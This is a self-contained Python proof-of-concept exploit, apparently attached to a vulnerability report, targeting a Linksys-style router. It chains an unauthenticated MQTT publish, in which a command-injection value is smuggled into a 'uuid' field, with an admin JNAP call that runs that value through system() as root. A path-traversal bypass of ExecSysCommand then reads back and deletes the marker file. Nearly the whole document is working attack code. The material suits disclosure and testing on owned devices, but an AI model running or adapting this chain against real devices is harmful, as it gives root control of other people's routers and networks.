#!/usr/bin/env python3
"""PoC for report-1: unauthenticated CONFIG-ME MQTT poisoning -> root command injection.

Stage 1 (no credentials): anonymous MQTT publish; JSON "uuid" stored verbatim
     into sysevent CONFIG-ME_<pin> without validation.
Stage 2 (admin): StartSmartConnectServer consumes it inside
     system("... pub_configure_self %s") -> root execution.
Readback via the ExecSysCommand lua bypass (report-6) as an independent channel.

usage:
  set LN11_HOST=192.168.x.x
  set LN11_ADMIN_PASSWORD=<password>
  py -3 poc.py

For owned devices only. Self-contained: stdlib only.
"""
import base64
import http.client
import json
import os
import socket
import ssl
import struct
import time

TOPIC = "network/master/CONFIG-ME/subdev/owned/status"
PIN = "1234"
MARK = "/tmp/pwned_LN11"
IGNITE = "http://linksys.com/jnap/nodes/smartconnect/StartSmartConnectServer"
EXE = "http://linksys.com/jnap/diagnostics/ExecSysCommand"
TRAV = "/lib/libnl/cli/cls/../../../../usr/bin/lua"  # -> realpath /usr/bin/lua


# ---------- stage 1: raw MQTT 3.1.1 ----------
def _rem(n):
    out = b""
    while True:
        b, n = n % 128, n // 128
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def _s(x):
    b = x.encode()
    return struct.pack(">H", len(b)) + b


def mqtt_publish(host, topic, payload):
    s = socket.create_connection((host, 1883), timeout=8)
    try:
        vh = _s("MQTT") + bytes([4, 0x02]) + struct.pack(">H", 60)
        body = vh + _s("poc-cli")
        s.sendall(bytes([0x10]) + _rem(len(body)) + body)
        s.settimeout(5)
        ck = s.recv(64)                       # CONNACK
        rc = ck[3] if len(ck) > 3 else None
        body = _s(topic) + struct.pack(">H", 1) + payload.encode()
        s.sendall(bytes([0x32]) + _rem(len(body)) + body)
        s.settimeout(5)
        pa = s.recv(4)                        # PUBACK
        return rc, len(pa) >= 4 and pa[0] == 0x40
    finally:
        try:
            s.sendall(b"\xe0\x00")
        except OSError:
            pass
        s.close()


# ---------- stage 2 + readback: JNAP over HTTPS ----------
def jnap(action, obj, timeout=15.0):
    host = os.environ.get("LN11_HOST", "192.168.1.1")
    pw = os.environ["LN11_ADMIN_PASSWORD"]
    auth = base64.b64encode(f"admin:{pw}".encode()).decode()
    body = json.dumps(obj, separators=(",", ":")).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=ctx)
    try:
        c.request("POST", "/JNAP/", body=body, headers={
            "X-JNAP-Action": action,
            "X-JNAP-Authorization": f"Basic {auth}",
            "Content-Type": "application/json; charset=UTF-8"})
        r = c.getresponse()
        return r.read(1024 * 1024).decode("utf-8", "replace")
    finally:
        c.close()


def lua_exec(code):
    body = jnap(EXE, {"cmd": TRAV, "param": "-e " + code})
    try:
        return json.loads(body)["output"]["cmdresult"]
    except Exception:
        return ""


def main():
    host = os.environ.get("LN11_HOST", "192.168.1.1")
    payload = json.dumps({"type": "status",
                          "uuid": f"$(id;uptime >{MARK})",
                          "data": {"pin": PIN}})
    rc, puback = mqtt_publish(host, TOPIC, payload)
    print(f"[1] anonymous MQTT -> CONNACK rc={rc}  PUBACK={puback}")
    if not puback:
        return 1
    print("[2] ignite:", jnap(IGNITE, {"pin": PIN, "wiredEnabled": True}, 20.0)[:100])
    time.sleep(1.0)
    out = lua_exec(f'local f=io.popen("cat {MARK}") print(f:read("*a"))')
    print(f"[3] readback {MARK}:\n{out or '(empty)'}")
    lua_exec(f'os.execute("rm -f {MARK}")')
    ok = "uid=0" in out
    print("[+] ROOT EXECUTION CONFIRMED" if ok else "[-] not confirmed")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
